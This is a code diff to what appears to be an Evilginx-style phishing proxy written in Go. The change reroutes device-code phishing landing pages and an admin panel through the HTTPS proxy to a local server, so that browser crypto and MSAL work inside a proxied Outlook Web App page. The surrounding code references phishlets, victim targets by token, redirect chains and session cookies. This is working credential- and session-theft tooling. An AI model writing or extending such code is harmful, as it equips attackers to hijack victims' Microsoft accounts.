@@ -191,16 +191,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// mode is enabled and the socket peer is a known Cloudflare edge node.
 			from_ip := GetRealIP(req, p.cfg.GetCloudflareMode())
 
-			// Device-code landing pages (/dc/<token>).
-			// Serve locally before any proxy logic so the page is returned
-			// regardless of which phishlet subdomain the URL uses.
-			if strings.HasPrefix(req.URL.Path, "/dc/") {
-				token := strings.TrimPrefix(req.URL.Path, "/dc/")
-				if tgt := GetTargetByToken(token); tgt != nil {
-					html := DCLandingPage(tgt)
-					return req, goproxy.NewResponse(req, "text/html; charset=utf-8", http.StatusOK, html)
+			// Device-code routes (/dc/…) and admin panel (/admin/…).
+			// Forwarded to the local HTTP server on :80 so they work over HTTPS
+			// (required for window.crypto / MSAL inside the OWA proxy page).
+			if strings.HasPrefix(req.URL.Path, "/dc/") || strings.HasPrefix(req.URL.Path, "/admin/") {
+				if resp := dcProxyLocal(req); resp != nil {
+					return req, resp
 				}
-				return req, goproxy.NewResponse(req, "text/plain", http.StatusNotFound, "not found")
+				return req, goproxy.NewResponse(req, "text/plain", http.StatusBadGateway, "local proxy error")
 			}
 
 			// Multi-layer redirect chain hops (/c/<token>).
@@ -2170,4 +2168,43 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// dcLocalClient never follows redirects — the caller (or the admin browser)
+// should handle them so Location headers are preserved correctly.
+var dcLocalClient = &http.Client{
+	CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
+		return http.ErrUseLastResponse
+	},
+	Timeout: 90 * time.Second,
+}
+
+// dcProxyLocal forwards any /dc/ or /admin/ request to the local HTTP server
+// on :80 and returns the raw response.  Running these routes through the
+// HTTPS proxy is what gives the browser a secure context (window.crypto).
+func dcProxyLocal(orig *http.Request) *http.Response {
+	localURL := "http://127.0.0.1" + orig.URL.RequestURI()
+	var bodyReader io.Reader
+	if orig.Body != nil {
+		bodyReader = orig.Body
+	}
+	req, err := http.NewRequest(orig.Method, localURL, bodyReader)
+	if err != nil {
+		return nil
+	}
+	// Forward original headers (skip hop-by-hop).
+	hop := map[string]bool{"connection": true, "te": true, "trailers": true, "transfer-encoding": true, "upgrade": true}
+	for k, v := range orig.Header {
+		if !hop[strings.ToLower(k)] {
+			req.Header[k] = v
+		}
+	}
+	// Keep the Host the local server expects.
+	req.Header.Set("Host", "127.0.0.1")
+
+	resp, err := dcLocalClient.Do(req)
+	if err != nil {
+		return nil
+	}
+	return resp
 }
